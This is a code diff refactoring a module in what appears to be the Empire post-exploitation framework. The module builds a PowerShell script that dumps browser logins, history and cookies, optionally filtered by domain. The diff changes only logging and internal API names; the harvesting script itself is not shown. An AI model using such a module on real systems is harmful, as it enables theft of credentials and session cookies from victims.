@@ -1,27 +1,27 @@
 from __future__ import print_function
 
-import pathlib
+import logging
 from builtins import object, str
 from typing import Dict
 
-from empire.server.common import helpers
-from empire.server.common.module_models import PydanticModule
-from empire.server.utils import data_util
+from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
+
+log = logging.getLogger(__name__)
 
 
 class Module(object):
     @staticmethod
     def generate(
         main_menu,
-        module: PydanticModule,
+        module: EmpireModule,
         params: Dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
 
         # read in the common module source code
-        script, err = main_menu.modules.get_module_source(
+        script, err = main_menu.modulesv2.get_module_source(
             module_name=module.script_path,
             obfuscate=obfuscate,
             obfuscate_command=obfuscation_command,
@@ -34,13 +34,13 @@ class Module(object):
 
         # check type
         if params["Type"].lower() not in ["all", "logins", "history", "cookies"]:
-            print(helpers.color("[!] Invalid value of Type, use default value: all"))
+            log.error("Invalid value of Type, use default value: all")
             params["Type"] = "all"
         script_end += " -Type " + params["Type"]
         # check domain
         if params["Domains"].lower() != "":
             if params["Type"].lower() != "cookies":
-                print(helpers.color("[!] Domains can only be used with Type cookies"))
+                log.error("Domains can only be used with Type cookies")
             else:
                 script_end += " -Domains ("
                 for domain in params["Domains"].split(","):
@@ -56,7 +56,7 @@ class Module(object):
             + ' completed!"'
         )
 
-        script = main_menu.modules.finalize_module(
+        script = main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
